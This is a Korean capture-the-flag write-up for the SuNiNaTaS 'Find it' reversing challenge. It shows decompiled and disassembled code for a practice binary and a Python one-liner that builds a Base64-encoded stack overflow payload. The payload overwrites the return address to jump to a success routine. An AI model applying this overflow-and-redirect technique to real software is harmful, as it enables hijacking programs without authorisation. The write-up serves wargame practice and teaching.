=====================================================================
[suninatas] Find it
=====================================================================

IDA로 확인하면 다음과 같은 main 함수를 확인할 수 있습니다.

.. code-block:: c

    int __cdecl main(int argc, const char **argv, const char **envp)
    {
        int result; // eax@3
        unsigned int v4; // ebx@7
        int v5; // [sp+10h] [bp-34h]@10
        __int16 v6; // [sp+16h] [bp-2Eh]@1
        unsigned int str_len; // [sp+34h] [bp-10h]@10
        unsigned int j; // [sp+38h] [bp-Ch]@5
        int i; // [sp+3Ch] [bp-8h]@4

        memset(&v6, 0, 30u);
        if ( argc <= 1 && !strcmp(*argv, "./suninatas") )
        {
            for ( i = 0; envp[i]; ++i )
            {
                for ( j = 0; ; ++j )
                {
                    v4 = j;
                    if ( v4 >= strlen(envp[i]) )
                        break;
                    envp[i][j] = 0;
                }
            }
            printf("Authenticate : ");
            _isoc99_scanf("%30s", &v6);
            memset(&input, 0, 12u);
            v5 = 0;
            str_len = Base64Decode(&v6, &v5);
            if ( str_len <= 12 )
            {
                memcpy(&input, v5, str_len); 
                if ( auth(str_len) == 1 )      //
                    correct();                 //
            }
            result = 0;
        }
        else
        {
            result = 0;
        }
        return result;
    }



.. code-block:: c

    _BOOL4 __cdecl auth(int a1)
    {
        char v2; // [sp+14h] [bp-14h]@1
        char *s2; // [sp+1Ch] [bp-Ch]@1
        int v4; // [sp+20h] [bp-8h]@1

        memcpy(&v4, &input, a1);
        s2 = calc_md5(&v2, 12);
        printf("hash : %s\n", s2);
        return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
    }


위의 correct 함수를 확인하면 input 값이 0xDEADBEEF이면 성공 메시지를 출력합니다.

.. code-block:: c

    void __noreturn correct()
    {
        if ( input == 0xDEADBEEF )
            puts("Congratulation! you are good!");
        exit(0);
    }

input값이 0xDEADBEEF가 되려면 input값의 주소를 확인해야합니다.

.. code-block:: c

    .bss:0811C9EC                 public input
    .bss:0811C9EC input           db    ? ;               ; DATA XREF: correct+6o
    .bss:0811C9EC                                         ; auth+Do ...
    .bss:0811C9ED                 db    ? ;
    .bss:0811C9EE                 db    ? ;
    .bss:0811C9EF                 db    ? ;
    .bss:0811C9F0                 db    ? ;
    .bss:0811C9F1                 db    ? ;
    .bss:0811C9F2                 db    ? ;
    .bss:0811C9F3                 db    ? ;
    .bss:0811C9F4                 db    ? ;
    .bss:0811C9F5                 db    ? ;
    .bss:0811C9F6                 db    ? ;
    .bss:0811C9F7                 db    ? ;
    .bss:0811C9F8                 db    ? ;
    .bss:0811C9F9                 db    ? ;
    .bss:0811C9FA                 db    ? ;
    .bss:0811C9FB                 db    ? ;

correct 함수 시작 주소를 확인해야합니다.

.. code-block:: c

    .text:0804925F                 public correct
    .text:0804925F correct         proc near               ; CODE XREF: main+150p
    .text:0804925F
    .text:0804925F var_C           = dword ptr -0Ch
    .text:0804925F
    .text:0804925F                 push    ebp
    .text:08049260                 mov     ebp, esp
    .text:08049262                 sub     esp, 28h
    .text:08049265                 mov     [ebp+var_C], offset input
    .text:0804926C                 mov     eax, [ebp+var_C]
    .text:0804926F                 mov     eax, [eax]
    .text:08049271                 cmp     eax, 0DEADBEEFh
    .text:08049276                 jnz     short loc_8049284
    .text:08049278                 mov     dword ptr [esp], offset aCongratulation ; "Congratulation! you are good!"
    .text:0804927F                 call    puts
    .text:08049284
    .text:08049284 loc_8049284:                            ; CODE XREF: correct+17j
    .text:08049284                 mov     dword ptr [esp], 0 ; status
    .text:0804928B                 call    _exit
    .text:0804928B correct         endp

.. code-block:: console

    $ (python -c "import base64;print base64.encodestring('\xef\xbe\xad\xde'+[correct 시작주소]+[input 주소])"; cat) |./suninatas 

